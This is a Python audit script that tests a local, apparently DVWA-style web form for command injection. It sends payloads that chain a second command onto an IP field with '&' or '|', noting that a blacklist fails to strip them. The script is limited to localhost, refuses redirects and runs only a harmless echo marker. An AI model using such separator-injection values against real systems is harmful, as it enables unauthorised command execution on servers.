#!/usr/bin/env python3
"""CMD-002 local-only command-injection marker check.

Scope: only http://127.0.0.1, http://localhost or http://[::1].
No redirect following, no reverse shell, no file access, no persistence.
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "CMD002_MARKER_9f3c"

PAYLOADS = {
    # Windows cmd.exe: a single '&' is not removed by the audited blacklist.
    "windows": "127.0.0.1 & echo " + MARKER,
    # Linux/*nix /bin/sh: '|' and a single '&' are not removed by the blacklist.
    "linux": "127.0.0.1 | echo " + MARKER,
}


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused by local-only policy", headers, fp
        )


def assert_local(url):
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("refusing non-HTTP(S) scheme: %s" % parsed.scheme)
    host = (parsed.hostname or "").lower()
    if host not in ("127.0.0.1", "localhost", "::1"):
        raise SystemExit("refusing non-local host: %s" % host)


def load_cookie(path):
    try:
        with open(path, "r", encoding="utf-8") as fh:
            value = fh.read().strip()
    except OSError as exc:
        raise SystemExit("cannot read cookie file: %s" % exc)
    if not value:
        raise SystemExit("cookie file is empty")
    return value


def main(argv=None):
    parser = argparse.ArgumentParser(description="CMD-002 harmless command-injection marker check")
    parser.add_argument("--base-url", default="http://127.0.0.1/")
    parser.add_argument("--path", default="/vulnerabilities/exec/")
    parser.add_argument("--cookie-file", required=True)
    parser.add_argument("--os", choices=sorted(PAYLOADS), default="linux")
    parser.add_argument("--control", action="store_true", help="send a plain IP baseline without marker")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args(argv)

    url = urllib.parse.urljoin(args.base_url, args.path)
    assert_local(url)

    payload = "127.0.0.1" if args.control else PAYLOADS[args.os]
    body = urllib.parse.urlencode({"Submit": "Submit", "ip": payload}).encode("utf-8")
    cookie = load_cookie(args.cookie_file)

    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("Cookie", cookie)

    opener = urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(request, timeout=args.timeout) as response:
            status = response.status
            text = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        print("http_error=%s reason=%s" % (exc.code, exc.reason))
        return 2
    except urllib.error.URLError as exc:
        print("connection_error=%s" % (exc.reason,))
        return 3
    except TimeoutError:
        print("timeout_after_%.1f_seconds" % args.timeout)
        return 4

    # The cookie is never printed; only the marker decision is reported.
    marker_present = MARKER in text
    ping_present = ("bytes from" in text) or ("Reply from" in text)
    print("http_status=%s" % status)
    print("payload_profile=%s" % args.os)
    print("marker_present=%s" % marker_present)
    print("ping_output_present=%s" % ping_present)
    if marker_present and ping_present:
        print("observation: marker and ping output coexist; inspect raw body for shell-separated command execution")
        return 0
    if marker_present:
        print("observation: marker present without ping output; could be reflection, not execution")
        return 1
    print("observation: marker absent; no execution evidence in this run")
    return 1


if __name__ == "__main__":
    sys.exit(main())